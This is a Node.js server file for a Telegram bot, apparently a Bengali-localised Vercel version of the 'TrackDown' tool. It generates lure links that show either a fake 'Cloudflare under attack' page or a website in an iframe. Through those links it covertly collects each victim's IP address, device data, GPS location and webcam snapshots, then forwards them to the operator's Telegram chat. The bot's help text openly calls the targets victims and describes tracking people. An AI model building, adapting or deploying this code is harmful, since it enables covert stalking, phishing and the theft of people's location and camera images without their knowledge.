require('dotenv').config();
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

// Bot setup (Webhook mode for Vercel)
const bot = new TelegramBot(process.env["bot"]); // No polling: true

// Middleware setup
const jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });

const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

// Host URL Configuration
// For Vercel, you should set HOST_URL in your environment variables
var hostURL = process.env.HOST_URL;
var use1pt = false;

// 1. Webhook Route - Telegram sends messages here
app.post('/bot' + process.env["bot"], (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// 2. Set Webhook Route - Run this ONCE after deployment
// Visit: https://YOUR-VERCEL-APP.vercel.app/setwebhook
app.get('/setwebhook', async (req, res) => {
  if (!hostURL || !process.env["bot"]) {
    return res.send("Error: HOST_URL or bot token not set in Vercel Environment Variables.");
  }
  const webhookUrl = `${hostURL}/bot${process.env["bot"]}`;
  try {
    await bot.setWebHook(webhookUrl);
    res.send(`Webhook set successfully to: ${webhookUrl}`);
  } catch (error) {
    res.send(`Error setting webhook: ${error.message}`);
  }
});

// Routes
app.get("/w/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }

  if (req.params.path != null) {
    res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    res.redirect("https://t.me/th30neand0nly0ne");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }

  if (req.params.path != null) {
    res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    res.redirect("https://t.me/th30neand0nly0ne");
  }
});

// Bot Message Handler
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  // Fixed Reply handling
  if (msg?.reply_to_message?.text == "🌐 আপনার URL দিন") {
    createLink(chatId, msg.text);
  }

  if (msg.text == "/start") {
    var m = {
      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "লিংক তৈরি করুন", callback_data: "crenew" }]] })
    };
    bot.sendMessage(chatId, `স্বাগতম ${msg.chat.first_name}! \nআপনি এই বটের মাধ্যমে শুধুমাত্র একটি লিংকের সাহায্যে মানুষকে ট্র্যাক করতে পারেন।\nএটি লোকেশন, ডিভাইসের তথ্য, ক্যামেরার ছবি ইত্যাদির মতো তথ্য সংগ্রহ করতে পারে।\n\nবিস্তারিত জানতে /help টাইপ করুন।`, m);
  } else if (msg.text == "/create") {
    createNew(chatId);
  } else if (msg.text == "/help") {
    bot.sendMessage(chatId, ` এই বটের মাধ্যমে আপনি শুধুমাত্র একটি সাধারণ লিংক পাঠিয়ে মানুষকে ট্র্যাক করতে পারেন।\n\nশুরু করতে /create পাঠান, এরপর এটি আপনাকে একটি URL চাইবে যা ভিক্টিমকে প্রলুব্ধ করতে আইফ্রেমে ব্যবহার করা হবে।\nURL পাওয়ার পর এটি আপনাকে দুটি লিংক পাঠাবে যা আপনি ট্র্যাকিংয়ের জন্য ব্যবহার করতে পারেন।\n\nবিবরণ:\n১. Cloudflare লিংক: এই পদ্ধতিতে তথ্য সংগ্রহের জন্য একটি 'Cloudflare under attack' পেজ দেখানো হবে এবং পরে ভিক্টিমকে নির্দিষ্ট URL-এ রিডাইরেক্ট করা হবে।\n২. Webview লিংক: এটি তথ্য সংগ্রহের জন্য আইফ্রেম ব্যবহার করে একটি ওয়েবসাইট (যেমন bing, ডেটিং সাইট ইত্যাদি) দেখাবে।\n( ⚠️ অনেক সাইটে x-frame হেডার থাকলে এই পদ্ধতিতে কাজ নাও করতে পারে। যেমন https://google.com)\n\nপ্রজেক্টটি ওপেন সোর্স: https://github.com/Th30neAnd0nly/TrackDown`);
  }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});

bot.on('polling_error', (error) => {
  // console.log(error.code); 
});

// Helper Functions
async function createLink(cid, msg) {
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
    var url = cid.toString(36) + '/' + btoa(msg);
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [[{ text: "নতুন লিংক তৈরি করুন", callback_data: "crenew" }]]
      })
    };

    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;

    bot.sendChatAction(cid, "typing");
    if (use1pt) {
      // Shortener logic could go here if re-enabled
      bot.sendMessage(cid, `নতুন লিংক সফলভাবে তৈরি হয়েছে।\nURL: ${msg}\n\n✅আপনার লিংকসমূহ\n\n🌐 CloudFlare লিংক: ${cUrl}\n\n🌐 WebView লিংক: ${wUrl}`, m);
    } else {
      bot.sendMessage(cid, `নতুন লিংক সফলভাবে তৈরি হয়েছে।\nURL: ${msg}\n\n✅আপনার লিংকসমূহ\n\n🌐 CloudFlare লিংক: ${cUrl}\n\n🌐 WebView লিংক: ${wUrl}`, m);
    }
  } else {
    bot.sendMessage(cid, `⚠️ অনুগ্রহ করে http বা https সহ একটি বৈধ URL দিন।`);
    createNew(cid);
  }
}

function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(cid, `🌐 আপনার URL দিন`, mk);
}

// Main App Routes
app.get("/", (req, res) => {
  var ip;
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else {
    ip = req.ip;
  }
  res.json({ "ip": ip });
});

app.post("/location", (req, res) => {
  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `অক্ষাংশ: ${lat}\nদ্রাঘিমাংশ: ${lon}\nনির্ভুলতা: ${acc} মিটার`);
    res.send("Done");
  }
});

app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  var ip;
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }

  if (uid != null && data != null) {
    if (data.indexOf(ip) < 0) {
      return res.send("ok");
    }
    data = data.replaceAll("<br>", "\n");
    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
    res.send("Done");
  }
});

app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;

  if (uid != null && img != null) {
    var buffer = Buffer.from(img, 'base64');
    var info = {
      filename: "camsnap.png",
      contentType: 'image/png'
    };

    try {
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
    } catch (error) {
      console.log(error);
    }
    res.send("Done");
  }
});

// Vercel Serverless Export
const port = process.env.PORT || 5000;
if (require.main === module) {
  app.listen(port, () => {
    console.log(`App Running on Port ${port}!`);
  });
}

module.exports = app;
